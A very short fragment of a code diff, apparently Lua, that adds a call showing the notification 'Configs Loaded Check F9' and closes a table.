+		createNotification("Configs Loaded Check F9")
+	end,
+})
+
